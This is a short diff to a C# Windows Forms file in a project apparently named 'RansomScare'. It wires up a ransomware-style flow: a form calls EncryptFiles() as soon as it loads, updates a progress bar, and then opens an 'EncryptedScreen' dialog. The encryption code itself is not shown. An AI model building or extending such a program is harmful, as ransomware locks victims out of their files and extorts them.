@@ -21,8 +21,22 @@ namespace RansomScare
             MaximizeBox = false;
             MinimizeBox = false;
 
+            // Encrypts files
             new Cryptography().EncryptFiles();
+
+            // Updates progress bar
+            statusBar.PerformStep();
+
+            // Enables 'finish' button
+            encryptionDoneButton.Enabled = true;
         }
 
+        private void encryptionDoneButton_Click(object sender, EventArgs e)
+        {
+            this.Hide();
+            EncryptedScreen encryptedScreen = new EncryptedScreen();
+            encryptedScreen.ShowDialog();
+            this.Close();
+        }
     }
 }
